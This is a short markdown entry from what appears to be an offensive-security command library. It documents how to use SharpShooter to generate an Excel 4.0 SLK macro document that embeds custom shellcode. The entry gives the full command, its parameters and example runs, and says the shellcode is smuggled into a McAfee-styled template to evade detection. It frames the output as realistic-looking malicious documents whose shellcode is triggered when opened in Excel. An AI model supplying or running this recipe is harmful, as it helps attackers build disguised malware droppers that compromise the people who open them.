---
type: command
executor: bash
data: >-
  python SharpShooter.py --payload slk --output foo --rawscfile
  /tmp/shellcode-86.bin --smuggle --template mcafee
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - payload-generation
  - xlm-macro
  - smuggling
verified: true
validated: true
---

# SharpShooter Create SLK Macro with Custom Shellcode

## Command

```bash
python SharpShooter.py --payload slk --output $_OUTPUT_FILE --rawscfile $_SHELLCODE_FILE --smuggle --template $_TEMPLATE
```

## Description

This command creates an Excel 4.0 SLK macro document using SharpShooter, embedding custom shellcode with smuggling into a legitimate template (e.g., McAfee) to evade detection. Useful for crafting realistic-looking malicious documents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --payload slk | Outputs in SLK format for XLM macros | Yes |
| --output $_OUTPUT_FILE | Base name for output (e.g., foo; generates foo.slk) | Yes |
| --rawscfile $_SHELLCODE_FILE | Path to custom raw shellcode (e.g., /tmp/shellcode-86.bin) | Yes |
| --smuggle | Enables payload smuggling into template | Yes |
| --template $_TEMPLATE | Template for smuggling (e.g., mcafee for benign appearance) | Yes |

## Examples

### Basic Usage

```bash
python SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
```

### Alternative Template

```bash
python SharpShooter.py --payload slk --output secure_doc --rawscfile encoded.bin --smuggle --template default
```

## Expected Output

Generates an SLK file (e.g., foo.slk) with smuggled macros. Console: "Smuggling payload into template... SLK created." If template mismatch, warning issued; verify by inspecting file content for XLM sheets and testing execution in Excel for shellcode trigger.

## Related

- [[procedures/xlm-excel-4-macro-sharpshooter-payload-creation]]
- [[tools/SharpShooter]]
